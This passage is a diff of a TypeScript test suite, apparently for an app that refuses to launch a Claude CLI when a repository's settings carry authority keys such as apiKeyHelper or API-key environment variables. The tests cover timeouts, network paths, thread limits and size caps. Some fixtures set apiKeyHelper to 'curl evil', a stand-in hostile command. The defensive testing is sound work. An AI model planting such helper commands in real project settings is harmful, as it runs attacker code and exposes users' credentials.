+      // block. Refused before any syscall -- and the REPORT says so, because a
+      // project on a share is unscannable on every launch for ever and a report
+      // that said nothing was indistinguishable from a project carrying nothing
+      // (code-quality review, MAJOR).
+      const unc = '\\\\10.255.255.1\\share\\proj'
+      const verdict = await gateThenLaunch(unc, 's-unc')
+      expect(verdict).toEqual({ status: 'not-scanned', reason: 'network-path' })
+      const report = diag.listManagedLaunchReports('p1')[0]
+      expect(report.preflight.findings.map((f) => f.id)).not.toContain('repository-settings-refused')
+      const notScanned = report.preflight.findings.find((f) => f.id === 'project-settings-not-scanned')!
+      expect(notScanned, 'the unscanned directory left the report looking clean').toBeDefined()
+      expect(notScanned.severity).toBe('warning')
+      expect(notScanned.detail).toMatch(/network path/)
+      expect(report.preflight.ok, 'an unscannable directory is a residual, not a refusal').toBe(true)
+      // ...and a LOCAL directory is still scanned right afterwards, so the refusal
+      // left no state stuck behind it.
+      const local = makeProject({ 'settings.json': { apiKeyHelper: 'x' } })
+      expect(await diag.gateManagedLaunch(local)).toEqual({ status: 'refused', keys: ['settings.json: apiKeyHelper'] })
+    })
+
+    it('gives up at its DEADLINE and reports not-scanned, rather than holding the session open', async () => {
+      // The deadline bounds the PROMISE, not the syscall: `fs.promises.open` takes
+      // no AbortSignal, so a wedged mount's open runs on until the OS gives up.
+      // What the deadline buys is that the SESSION starts -- unchecked, and said
+      // so -- instead of waiting out an SMB timeout measured at 42 seconds.
+      const cwd = path.resolve('/wedged/deadline')
+      vi.useFakeTimers()
+      const open = vi.spyOn(fs.promises, 'open').mockImplementation(() => new Promise(() => {}))
       try {
-        fs.mkdirSync(path.join(cwd, '.claude'))
-        const file = path.join(cwd, '.claude', 'settings.json')
-        const source = JSON.stringify({ apiKeyHelper: 'curl evil', model: 'opus' }, null, 2)
-        fs.writeFileSync(file, source)
+        let verdict: ProjectGateResult | undefined
+        void diag.gateManagedLaunch(cwd).then((v) => { verdict = v })
+        await vi.advanceTimersByTimeAsync(2_900)
+        expect(verdict, 'the gate gave up before its 3000 ms deadline').toBeUndefined()
+        await vi.advanceTimersByTimeAsync(200)
+        expect(verdict).toEqual({ status: 'not-scanned', reason: 'timed-out' })
 
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-2', cwd })
-        await settled(true)
-
-        const finding = diag.listManagedLaunchReports('p1')[0].preflight.findings
-          .find((f) => f.id === 'repository-settings-suppressed')
-        expect(finding, 'the project settings finding was not raised').toBeDefined()
-        expect(finding!.detail).toContain('apiKeyHelper')
-        expect(finding!.severity).toBe('info')   // reported, never blocking
-        // The repository's file is not the app's to change (D17).
-        expect(fs.readFileSync(file, 'utf8')).toBe(source)
+        const env = withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-deadline', cwd, projectGate: verdict! })
+        expect(env.USERPROFILE, 'the launch was refused for a check that merely timed out').toBe(HOME)
+        const report = diag.listManagedLaunchReports('p1')[0]
+        const notScanned = report.preflight.findings.find((f) => f.id === 'project-settings-not-scanned')!
+        expect(notScanned.severity).toBe('warning')
+        expect(notScanned.detail).toMatch(/deadline/)
+        expect(report.preflight.ok).toBe(true)
       } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
+        open.mockRestore()
+        vi.useRealTimers()
+        diag._resetProjectScanStateForTest()
       }
     })
 
-    it('does NOT read the project directory on the launch path itself', async () => {
-      // The blocking failure this was moved for: `statSync`/`readFileSync` on a
-      // working directory that lives on an unreachable share froze the Electron
-      // main thread for the SMB timeout -- measured at 42 s, per file, per
-      // launch, with no attacker involved (adversarial review, BLOCKER). A
-      // `try/catch` does not catch a blocking syscall; the only fix is not to
-      // make the call there. This asserts the shape: the launch returns with no
-      // project finding, and the finding appears only once the scan settles.
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
+    it('holds at most TWO filesystem threads, and resumes the moment one of them settles', async () => {
+      // The deadline is not the bound; the count of scans STARTED AND NOT SETTLED
+      // is. libuv's default pool is four threads and this app never raises it, so
+      // four wedged opens stall every other threadpool consumer in the main
+      // process -- all of `fs.promises`, and `dns.lookup`, which is how http(s)
+      // resolves a hostname (measured at 21 s of stalled reads and DNS,
+      // adversarial re-attack, BLOCKER). A watchdog that "released" a slot early
+      // was one more stranded thread per window (round 5, BLOCKER), so the slot
+      // comes back only on a real settle.
+      const cwd = (name: string) => path.resolve(`/wedged/${name}`)
+      vi.useFakeTimers()
+      // A scan opens two files in turn. The FIRST hangs until told to settle; the
+      // second is rejected at once, so settling the first settles the whole scan.
+      const settle: Array<() => void> = []
+      const open = vi.spyOn(fs.promises, 'open').mockImplementation(((f: unknown) =>
+        String(f).endsWith('settings.local.json')
+          ? Promise.reject(new Error('gone'))
+          : new Promise((_res, reject) => { settle.push(() => reject(new Error('gone'))) })) as never)
+      const scansStarted = () => open.mock.calls.filter((c) => !String(c[0]).endsWith('settings.local.json')).length
       try {
-        fs.mkdirSync(path.join(cwd, '.claude'))
-        fs.writeFileSync(path.join(cwd, '.claude', 'settings.json'), JSON.stringify({ apiKeyHelper: 'x' }))
+        void diag.gateManagedLaunch(cwd('a'))
+        void diag.gateManagedLaunch(cwd('b'))
+        await vi.advanceTimersByTimeAsync(0)
+        expect(scansStarted()).toBe(2)
+        expect(diag._projectScanStateForTest()).toMatchObject({ outstanding: 2, ceilingLogged: false })
 
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-sync', cwd })
-        // Synchronously after the launch: recorded, and nothing read yet.
-        expect(diag.listManagedLaunchReports('p1')[0].preflight.findings.map((f) => f.id))
-          .not.toContain('repository-settings-suppressed')
+        // A THIRD directory: no thread to take, so it waits for a slot and gives
+        // up at its OWN deadline with the ceiling as the reason. The two earlier
+        // gates time out at the same point, and that does NOT free a slot -- the
+        // opens are still running.
+        let third: ProjectGateResult | undefined
+        void diag.gateManagedLaunch(cwd('c')).then((v) => { third = v })
+        await vi.advanceTimersByTimeAsync(3_100)
+        expect(scansStarted(), 'a third scan started while two earlier ones still held threads').toBe(2)
+        expect(third).toEqual({ status: 'not-scanned', reason: 'thread-ceiling' })
+        expect(diag._projectScanStateForTest()).toMatchObject({ outstanding: 2, ceilingLogged: true })
 
-        await settled(true)
-        expect(diag.listManagedLaunchReports('p1')[0].preflight.findings.map((f) => f.id))
-          .toContain('repository-settings-suppressed')
+        // One settles: the thread is BACK, the episode is over, and the
+        // de-duplication flag clears with it -- the ceiling is transient, not a
+        // switch that turns the check off for the life of the process.
+        settle.shift()!()
+        await vi.advanceTimersByTimeAsync(0)
+        for (let i = 0; i < 20; i += 1) await Promise.resolve()
+        expect(diag._projectScanStateForTest(), 'the log flag outlived the episode')
+          .toMatchObject({ outstanding: 1, ceilingLogged: false })
+
+        // ...and the freed slot is usable: a new directory starts a real scan.
+        void diag.gateManagedLaunch(cwd('d'))
+        await vi.advanceTimersByTimeAsync(0)
+        expect(scansStarted(), 'the freed slot was never reused').toBe(3)
       } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
+        for (const s of settle.splice(0)) s()
+        open.mockRestore()
+        vi.useRealTimers()
+        // The scans settled above finish on MICROTASKS, after this block returns,
+        // and each decrements the outstanding count when it does. Drain them
+        // BEFORE putting the counters back, or they land on a reset counter and
+        // drive it negative -- which is worse than a leak, because a negative
+        // count hides a real one from the next case.
+        for (let i = 0; i < 100; i += 1) await Promise.resolve()
+        await new Promise((r) => setTimeout(r, 10))
+        diag._resetProjectScanStateForTest()
       }
     })
 
-    it('refuses a project settings file that is over the size cap', async () => {
-      // The cap had no test at all, so nothing stopped it being raised or
-      // deleted (adversarial review, MAJOR). 128 KiB is already generous for a
-      // settings file; the point is that SOMETHING bounds what a repository can
-      // make this parse.
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
-      try {
-        fs.mkdirSync(path.join(cwd, '.claude'))
-        // Valid JSON, authority-bearing, and comfortably over the cap.
-        const padding = 'x'.repeat(200 * 1024)
-        fs.writeFileSync(
-          path.join(cwd, '.claude', 'settings.json'),
-          JSON.stringify({ apiKeyHelper: 'curl evil', note: padding }),
-        )
-
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-big', cwd })
-        await settled()
-
-        expect(diag.listManagedLaunchReports('p1')[0].preflight.findings.map((f) => f.id))
-          .not.toContain('repository-settings-suppressed')
-      } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
+    it('gives the thread BACK when a scan settles, so healthy launches never reach the ceiling', async () => {
+      // The other half of the ceiling. It counts scans started and not settled,
+      // so a settle that failed to decrement would disable the check after the
+      // second healthy launch of the session -- an availability guard turned into
+      // a permanent off switch.
+      for (let i = 0; i < 5; i += 1) {
+        const dir = makeProject({ 'settings.json': { apiKeyHelper: 'x' } })
+        expect(await diag.gateManagedLaunch(dir), `scan ${i} did not run`)
+          .toEqual({ status: 'refused', keys: ['settings.json: apiKeyHelper'] })
+        expect(diag._projectScanStateForTest(), `scan ${i} never gave its thread back`)
+          .toMatchObject({ inFlight: 0, outstanding: 0 })
       }
     })
 
-    it('refuses a project settings path that is not a regular file', async () => {
-      // The portable half: a directory where the settings file should be. It
-      // must not crash and must not produce a finding. Note honestly that this
-      // does NOT discriminate the `isFile()` check on its own -- reading a
-      // directory throws anyway; the test below is the one that does.
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
+    it('two concurrent launches into the SAME directory share ONE scan and get the SAME verdict', async () => {
+      // Two sessions started into one repository must not cost two threads, and
+      // must not be able to disagree about it.
+      const cwd = makeProject({ 'settings.json': { apiKeyHelper: 'x' } })
+      const realOpen = fs.promises.open.bind(fs.promises)
+      const opened: string[] = []
+      const open = vi.spyOn(fs.promises, 'open').mockImplementation(((f: never, ...rest: never[]) => {
+        opened.push(String(f))
+        return (realOpen as never as (...a: never[]) => unknown)(f, ...rest)
+      }) as never)
       try {
-        fs.mkdirSync(path.join(cwd, '.claude', 'settings.json'), { recursive: true })
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-dir', cwd })
-        await settled()
-        expect(diag.listManagedLaunchReports('p1')[0].preflight.findings.map((f) => f.id))
-          .not.toContain('repository-settings-suppressed')
+        const first = diag.gateManagedLaunch(cwd)
+        const second = diag.gateManagedLaunch(cwd)
+        // The scan is registered BEFORE the first await, which is what lets the
+        // second call find it in the same tick.
+        expect(diag._projectScanStateForTest(), 'the second launch started a second scan')
+          .toMatchObject({ inFlight: 1, outstanding: 1 })
+        const [a, b] = await Promise.all([first, second])
+        expect(a).toEqual({ status: 'refused', keys: ['settings.json: apiKeyHelper'] })
+        expect(b).toEqual(a)
+        // ONE open per settings FILE, not one per launch.
+        expect(opened.filter((f) => f.endsWith('settings.json'))).toHaveLength(1)
+        expect(opened.filter((f) => f.endsWith('settings.local.json'))).toHaveLength(1)
+      } finally { open.mockRestore() }
+    })
+
+    it('peekGateVerdict answers SYNCHRONOUSLY inside the reuse window, and not before a scan or after it', async () => {
+      // For the two paths that must stay synchronous up to their spawn -- the
+      // auth-status probe and the headless runner, where overlapping calls for one
+      // profile share a single subprocess so two CLIs cannot race one single-use
+      // refresh token -- an await before the spawn would reopen that race.
+      const cwd = makeProject()
+      expect(diag.peekGateVerdict(cwd), 'a verdict existed before any scan').toBeUndefined()
+      const verdict = await diag.gateManagedLaunch(cwd)
+      expect(diag.peekGateVerdict(cwd)).toEqual(verdict)
+      // A not-scanned verdict is NEVER stored: it is worth a fresh attempt.
+      const unc = '\\\\10.255.255.1\\share\\proj'
+      expect(await diag.gateManagedLaunch(unc)).toEqual({ status: 'not-scanned', reason: 'network-path' })
+      expect(diag.peekGateVerdict(unc)).toBeUndefined()
+      // Past the five-second window the caller gets nothing and must await a
+      // fresh gate rather than reuse a stale answer.
+      vi.useFakeTimers()
+      try {
+        vi.setSystemTime(Date.now() + 6_000)
+        expect(diag.peekGateVerdict(cwd), 'a stale verdict was reused').toBeUndefined()
+      } finally { vi.useRealTimers() }
+    })
+
+    it('the CHOKE POINT itself opens nothing: the gate did the reading, before it was called', async () => {
+      // The blocking failure the gate was extracted for: `statSync` +
+      // `readFileSync` inside `withProfileHome` on a working directory living on
+      // an unreachable share froze the Electron MAIN THREAD for the SMB timeout --
+      // 42 seconds, twice, on two unrelated dead hosts, per file, per launch
+      // (adversarial review, BLOCKER). A try/catch cannot catch a blocking
+      // syscall; the only fix is not to make the call there. withProfileHome is
+      // synchronous, so anything it opened would be on that thread.
+      const cwd = makeProject({ 'settings.json': { apiKeyHelper: 'x' } })
+      const projectGate = await diag.gateManagedLaunch(cwd)
+      const open = vi.spyOn(fs.promises, 'open')
+      const openSync = vi.spyOn(fs, 'openSync')
+      const readFileSync = vi.spyOn(fs, 'readFileSync')
+      const statSync = vi.spyOn(fs, 'statSync')
+      try {
+        expect(() => withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-sync', cwd, projectGate })).toThrow()
+        expect(open, 'the choke point opened a file on the launch path').not.toHaveBeenCalled()
+        const touched = [...openSync.mock.calls, ...readFileSync.mock.calls, ...statSync.mock.calls]
+          .map((c) => String(c[0])).filter((f) => f.startsWith(cwd))
+        expect(touched, 'the choke point read the project directory synchronously').toEqual([])
       } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
+        open.mockRestore(); openSync.mockRestore(); readFileSync.mockRestore(); statSync.mockRestore()
       }
+    })
+
+    it('SKIPS a project settings file that is over the size cap instead of parsing it', async () => {
+      // The cap had no test at all, so nothing stopped it being raised or deleted
+      // (adversarial review, MAJOR). 128 KiB is already generous for a settings
+      // file; the point is that SOMETHING bounds what a repository can make this
+      // parse. The existing bound is a SKIP -- an oversized file is not read, so
+      // the gate reports clean and the launch proceeds.
+      const cwd = makeProject({ 'settings.json': JSON.stringify({ apiKeyHelper: 'curl evil', note: 'x'.repeat(200 * 1024) }) })
+      expect(await diag.gateManagedLaunch(cwd)).toEqual({ status: 'clean' })
+    })
+
+    it('SKIPS a project settings path that is not a regular file', async () => {
+      // The portable half: a directory where the settings file should be. It must
+      // not throw and must not produce a verdict. Note honestly that this does
+      // NOT discriminate the `isFile()` check on its own -- reading a directory
+      // throws anyway; the FIFO case below is the one that does.
+      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
+      projects.push(cwd)
+      fs.mkdirSync(path.join(cwd, '.claude', 'settings.json'), { recursive: true })
+      expect(await diag.gateManagedLaunch(cwd)).toEqual({ status: 'clean' })
     })
 
     it.skipIf(process.platform === 'win32')('returns rather than BLOCKING on a FIFO where the settings file should be', async () => {
@@ -1505,290 +1794,54 @@ describe('the launch paths', () => {
       // path, so on win32 the `isFile()` half of that check is UNVERIFIED and a
       // mutant removing it survives there. If such a shape is found, add it.
       const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-fifo-'))
-      try {
-        fs.mkdirSync(path.join(cwd, '.claude'))
-        execFileSync('mkfifo', [path.join(cwd, '.claude', 'settings.json')])
+      projects.push(cwd)
+      fs.mkdirSync(path.join(cwd, '.claude'))
+      execFileSync('mkfifo', [path.join(cwd, '.claude', 'settings.json')])
 
-        const scan = diag._projectAuthoritySettingsKeysForTest(cwd)
-        const timeout = new Promise((resolve) => setTimeout(() => resolve('BLOCKED'), 3000))
-        expect(await Promise.race([scan.then(() => 'RETURNED'), timeout]), 'the scan blocked on a FIFO').toBe('RETURNED')
-        expect(await scan).toEqual([])
-      } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
-      }
+      const scan = diag._projectAuthoritySettingsKeysForTest(cwd)
+      const timeout = new Promise((resolve) => setTimeout(() => resolve('BLOCKED'), 3000))
+      expect(await Promise.race([scan.then(() => 'RETURNED'), timeout]), 'the scan blocked on a FIFO').toBe('RETURNED')
+      expect(await scan).toEqual([])
     }, 10000)
 
     it('collapses many SPELLINGS of one authority name to one reported key', async () => {
       // The first of the two bounds. JSON keys are distinct and the `env` match
-      // is case-insensitive, so one authority name can appear hundreds of times
-      // in a file well inside the size cap. Reporting the CANONICAL name makes
-      // that one entry (adversarial review, MINOR).
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
-      try {
-        fs.mkdirSync(path.join(cwd, '.claude'))
-        const env: Record<string, string> = {}
-        for (let i = 0; i < 200; i += 1) {
-          env[i % 2 ? `anthropic_api_key${'_'.repeat(i)}` : `ANTHROPIC_API_KEY${'_'.repeat(i)}`] = 'x'
-        }
-        env.ANTHROPIC_API_KEY = 'x'
-        fs.writeFileSync(path.join(cwd, '.claude', 'settings.json'), JSON.stringify({ env }))
-
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-many', cwd })
-        await settled(true)
-
-        const finding = diag.listManagedLaunchReports('p1')[0].preflight.findings
-          .find((f) => f.id === 'repository-settings-suppressed')
-        expect(finding).toBeDefined()
-        expect(finding!.detail.length, 'the finding text is unbounded').toBeLessThan(2000)
-      } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
+      // is case-insensitive, so ONE authority name can appear hundreds of times
+      // in a file well inside the size cap. Reporting the CANONICAL spelling --
+      // never the file's -- makes that one entry, and stops a confusable spelling
+      // being echoed into a security notice as if it were a variable name
+      // (adversarial review, MINOR).
+      const env: Record<string, string> = {}
+      const name = 'ANTHROPIC_API_KEY'
+      for (let i = 0; i < 200; i += 1) {
+        // A distinct JSON key each time, every one folding to the same variable.
+        env[[...name].map((ch, j) => ((i >> j) & 1 ? ch.toLowerCase() : ch)).join('')] = 'x'
       }
+      expect(Object.keys(env).length, 'the spellings collapsed before the gate saw them').toBeGreaterThan(50)
+      const cwd = makeProject({ 'settings.json': { env } })
+      expect(await diag.gateManagedLaunch(cwd)).toEqual({ status: 'refused', keys: [`settings.json: env.${name}`] })
     })
 
     it('caps how many DISTINCT project keys reach the panel', async () => {
       // The second bound, and the one canonicalisation does not provide: a file
-      // can carry many different authority names. The finding text crosses IPC
-      // and renders into a single list item, so the list is capped and the rest
-      // become a count.
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
-      try {
-        fs.mkdirSync(path.join(cwd, '.claude'))
-        const env: Record<string, string> = {}
-        for (const e of CLAUDE_AUTHORITY_VARIABLES.filter((v) => v.settingsEnv === 'strip').slice(0, 60)) env[e.name] = 'x'
-        expect(Object.keys(env).length, 'not enough distinct names to exceed the cap').toBeGreaterThan(40)
-        fs.writeFileSync(path.join(cwd, '.claude', 'settings.json'), JSON.stringify({ env }))
+      // can carry many DIFFERENT authority names. The list crosses IPC and
+      // renders into a single list item, so it is capped and the rest become a
+      // count.
+      const env: Record<string, string> = {}
+      for (const entry of CLAUDE_AUTHORITY_VARIABLES.filter((v) => v.settingsEnv === 'strip').slice(0, 60)) env[entry.name] = 'x'
+      expect(Object.keys(env).length, 'not enough distinct names to exceed the cap').toBeGreaterThan(40)
+      const cwd = makeProject({ 'settings.json': { env } })
 
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-distinct', cwd })
-        await settled(true)
+      const projectGate = await diag.gateManagedLaunch(cwd) as { status: 'refused'; keys: readonly string[] }
+      expect(projectGate.status).toBe('refused')
+      expect(projectGate.keys, 'the verdict is not bounded').toHaveLength(21)   // 20 names + the overflow line
+      expect(projectGate.keys[20]).toMatch(/^and \d+ more$/)
 
-        const finding = diag.listManagedLaunchReports('p1')[0].preflight.findings
-          .find((f) => f.id === 'repository-settings-suppressed')
-        expect(finding).toBeDefined()
-        expect(finding!.detail, 'the overflow is not reported as a count').toMatch(/and \d+ more/)
-        // 20 names plus the overflow line, not 60.
-        expect(finding!.detail.split(',').length).toBeLessThan(25)
-      } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
-      }
+      expect(() => withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-distinct', cwd, projectGate })).toThrow()
+      const finding = newestFindings().find((f) => f.id === 'repository-settings-refused')!
+      expect(finding.detail, 'the overflow is not reported as a count').toMatch(/and \d+ more/)
+      expect(finding.detail.split(',').length).toBeLessThan(25)
     })
-
-    it('a project with no settings of its own raises no such finding', async () => {
-      const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-'))
-      try {
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-3', cwd })
-        await settled()
-        expect(diag.listManagedLaunchReports('p1')[0].preflight.findings.map((f) => f.id))
-          .not.toContain('repository-settings-suppressed')
-      } finally {
-        try { fs.rmSync(cwd, { recursive: true, force: true }) } catch { /* ignore */ }
-      }
-    })
-
-    it('runs at most ONE project scan at a time, however many launches there are', async () => {
-      // The deadline bounds the PROMISE, not the syscall: `fs.promises.open`
-      // takes no AbortSignal, so a scan that gives up leaves the open running
-      // on the libuv threadpool until the OS gives up. Four of those starve the
-      // pool -- every `fs.promises` call and every `dns.lookup` in the main
-      // process stalls, measured at 21 s (adversarial re-attack, BLOCKER
-      // reopened). Single-flight is what caps the exposure at one thread.
-      const a = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-a-'))
-      const b = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-project-b-'))
-      try {
-        for (const dir of [a, b]) {
-          fs.mkdirSync(path.join(dir, '.claude'))
-          fs.writeFileSync(path.join(dir, '.claude', 'settings.json'), JSON.stringify({ apiKeyHelper: 'x' }))
-        }
-        // Both launches in ONE tick: the second sees the first's scan
-        // outstanding, because the flag is taken before any await.
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-a', cwd: a })
-        withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-b', cwd: b })
-        await settled()
-
-        const amended = diag.listManagedLaunchReports('p1')
-          .filter((r) => r.preflight.findings.some((f) => f.id === 'repository-settings-suppressed'))
-        expect(amended.map((r) => r.sessionId), 'more than one scan ran concurrently').toEqual(['s-a'])
-        // ...and the launch whose scan was SKIPPED says so on its own report --
-        // the newest one, which is the one the panel reads. Left silent, it read
-        // as "this project carries nothing" (code-quality review, MAJOR).
-        const skipped = diag.listManagedLaunchReports('p1').find((r) => r.sessionId === 's-b')!
-        const notScanned = skipped.preflight.findings.find((f) => f.id === 'project-settings-not-scanned')
-        expect(notScanned, 'the skipped scan left the report looking clean').toBeDefined()
-        expect(notScanned!.severity).toBe('info')
-        expect(notScanned!.detail).toMatch(/another project scan was still running/i)
-        expect(skipped.preflight.ok).toBe(true)
-      } finally {
-        for (const dir of [a, b]) { try { fs.rmSync(dir, { recursive: true, force: true }) } catch { /* ignore */ } }
-      }
-    })
-
-    it('gives the thread BACK when a scan settles, so healthy scans never reach the ceiling', async () => {
-      // The other half of the ceiling. It counts scans started and not settled,
-      // so a settle that failed to decrement would disable the diagnostic after
-      // the second healthy launch of the session -- the ceiling turning an
-      // availability guard into a permanent off switch.
-      diag._resetProjectScanStateForTest()
-      const dirs: string[] = []
-      try {
-        // Well past MAX_OUTSTANDING_PROJECT_SCANS, strictly one after another.
-        for (let i = 0; i < 5; i += 1) {
-          const dir = fs.mkdtempSync(path.join(os.tmpdir(), `wp1-project-seq-${i}-`))
-          dirs.push(dir)
-          fs.mkdirSync(path.join(dir, '.claude'))
-          fs.writeFileSync(path.join(dir, '.claude', 'settings.json'), JSON.stringify({ apiKeyHelper: 'x' }))
-          withProfileHome({ PATH: '/x' }, HOME, { launchId: `seq-${i}`, cwd: dir })
-          await settled(true)
-          const newest = diag.listManagedLaunchReports('p1').find((r) => r.sessionId === `seq-${i}`)
-          expect(newest?.preflight.findings.map((f) => f.id), `scan ${i} did not run`).toContain('repository-settings-suppressed')
-        }
-      } finally {
-        for (const dir of dirs) { try { fs.rmSync(dir, { recursive: true, force: true }) } catch { /* ignore */ } }
-        diag._resetProjectScanStateForTest()
-      }
-    })
-
-    it('holds at most TWO filesystem threads, however long a wedged mount stays wedged', async () => {
-      // The watchdog re-opens the single-flight FLAG after a minute so one
-      // wedged mount does not disable the diagnostic for the life of the
-      // process. It cannot give the THREAD back -- `fs.promises.open` takes no
-      // AbortSignal -- so the first version stranded one more libuv thread per
-      // window, and four launches into one dead mapped drive, a minute apart,
-      // consumed the whole default pool for good: every `fs.promises` call and
-      // every DNS lookup in the main process then queued behind them
-      // (adversarial round 5, BLOCKER). The flag is not the bound; the count of
-      // scans STARTED AND NOT SETTLED is.
-      diag._resetProjectScanStateForTest()
-      vi.useFakeTimers()
-      // An open that never returns: the wedged mount.
-      const open = vi.spyOn(fs.promises, 'open').mockImplementation(() => new Promise(() => {}))
-      try {
-        const launch = (id: string) => withProfileHome({ PATH: '/x' }, HOME, { launchId: id, cwd: 'Z:/dead/project' })
-        launch('w-1')
-        await vi.advanceTimersByTimeAsync(0)
-        expect(open).toHaveBeenCalledTimes(1)
-
-        // Inside the first window the FLAG refuses the second launch.
-        launch('w-2')
-        await vi.advanceTimersByTimeAsync(0)
-        expect(open).toHaveBeenCalledTimes(1)
-        // ...INCLUDING after the two-second DEADLINE. The deadline abandons the
-        // await; it does not end the syscall, so the flag must outlive it.
-        // Releasing here is the original starvation bug -- a second scan two
-        // seconds into a blocked open, a third two seconds after that -- and
-        // the mutant that reintroduces it survived until this assertion existed,
-        // because every other test finishes inside the deadline.
-        await vi.advanceTimersByTimeAsync(2_500)
-        launch('w-after-deadline')
-        await vi.advanceTimersByTimeAsync(0)
-        expect(open, 'the flag was released at the DEADLINE, while the open still held its thread').toHaveBeenCalledTimes(1)
-
-        // The watchdog re-opens the flag; a second scan may start. Two threads.
-        await vi.advanceTimersByTimeAsync(60_000)
-        launch('w-3')
-        await vi.advanceTimersByTimeAsync(0)
-        expect(open).toHaveBeenCalledTimes(2)
-
-        // ...and that is the CEILING. However many more windows pass, and
-        // however many more launches arrive, no third thread is ever taken.
-        for (let i = 0; i < 5; i += 1) {
-          await vi.advanceTimersByTimeAsync(60_000)
-          launch(`w-more-${i}`)
-          await vi.advanceTimersByTimeAsync(0)
-        }
-        expect(open, 'a third scan started while two earlier ones still held threads').toHaveBeenCalledTimes(2)
-
-        // Each refused launch SAYS it was refused, with the reason that applied:
-        // the first wedged scan timed out on its own report, the flag refused
-        // the second, the ceiling refused the rest (code-quality review, MAJOR).
-        const reason = (id: string): string | undefined =>
-          diag.listManagedLaunchReports('p1').find((r) => r.sessionId === id)?.preflight.findings
-            .find((f) => f.id === 'project-settings-not-scanned')?.detail
-        expect(reason('w-1')).toMatch(/did not answer within two seconds/)
-        expect(reason('w-2')).toMatch(/another project scan was still running/i)
-        expect(reason('w-more-4')).toMatch(/never returned/)
-        expect(reason('w-more-4'), 'the ceiling is transient, not a switch').not.toMatch(/DISABLED/)
-      } finally {
-        open.mockRestore()
-        vi.useRealTimers()
-        diag._resetProjectScanStateForTest()
-      }
-    })
-
-    it('logs the ceiling once per EPISODE, not once per process', async () => {
-      // The flag that de-duplicated the ceiling warning was never cleared
-      // outside the test seam, so a genuinely new episode an hour later logged
-      // nothing (code-quality review, MINOR). It clears when a scan settles and
-      // the count drops back under the ceiling.
-      diag._resetProjectScanStateForTest()
-      vi.useFakeTimers()
-      // A scan opens two files in turn. The FIRST hangs until told to settle;
-      // the second is refused at once, so settling the first settles the scan.
-      const settle: (() => void)[] = []
-      const open = vi.spyOn(fs.promises, 'open').mockImplementation((p) =>
-        String(p).endsWith('settings.local.json')
-          ? Promise.reject(new Error('gone'))
-          : new Promise((_, reject) => { settle.push(() => reject(new Error('gone'))) }),
-      )
-      const scansStarted = () => open.mock.calls.filter((c) => !String(c[0]).endsWith('settings.local.json')).length
-      try {
-        const launch = (id: string) => withProfileHome({ PATH: '/x' }, HOME, { launchId: id, cwd: 'Z:/dead/project' })
-        // Two wedged scans, a watchdog window apart (the flag refuses inside a
-        // window; only the watchdog lets a second thread be taken).
-        launch('e-1'); await vi.advanceTimersByTimeAsync(60_000)
-        launch('e-2'); await vi.advanceTimersByTimeAsync(60_000)
-        expect(scansStarted()).toBe(2)
-        expect(diag._projectScanStateForTest().ceilingLogged).toBe(false)
-        launch('e-3'); await vi.advanceTimersByTimeAsync(0)
-        expect(diag._projectScanStateForTest()).toMatchObject({ outstanding: 2, ceilingLogged: true })
-        // A scan settles: the thread is back, the episode is over, and the
-        // de-duplication flag is cleared with it.
-        settle.shift()!(); await vi.advanceTimersByTimeAsync(0)
-        expect(diag._projectScanStateForTest(), 'the flag outlived the episode').toMatchObject({ outstanding: 1, ceilingLogged: false })
-        // ...a new scan takes the freed slot, and the NEXT ceiling hit is a
-        // new episode that logs again.
-        launch('e-5'); await vi.advanceTimersByTimeAsync(60_000)
-        expect(scansStarted()).toBe(3)
-        launch('e-6'); await vi.advanceTimersByTimeAsync(0)
-        expect(diag._projectScanStateForTest()).toMatchObject({ outstanding: 2, ceilingLogged: true })
-      } finally {
-        for (const s of settle) s()
-        open.mockRestore()
-        vi.useRealTimers()
-        diag._resetProjectScanStateForTest()
-      }
-    })
-
-    it('never scans a project directory on a NETWORK path', async () => {
-      // The measured freeze came from a UNC working directory, and it is the
-      // one shape recognisable from the string without a call that could itself
-      // block. Refused before any syscall.
-      withProfileHome({ PATH: '/x' }, HOME, { launchId: 's-unc', cwd: '\\\\10.255.255.1\\share\\proj' })
-      await settled('project-settings-not-scanned')
-      const unc = diag.listManagedLaunchReports('p1')[0].preflight.findings
-      expect(unc.map((f) => f.id)).not.toContain('repository-settings-suppressed')
-      // The refusal is on the REPORT. A project on a share is refused on every
-      // launch for ever, and a report that said nothing about it was
-      // indistinguishable from a project with no settings -- so a
-      // `.claude/settings.json` carrying `apiKeyHelper` there was suppressed
-      // with the panel silent about it, permanently (code-quality review, MAJOR).
-      const notScanned = unc.find((f) => f.id === 'project-settings-not-scanned')
-      expect(notScanned).toBeDefined()
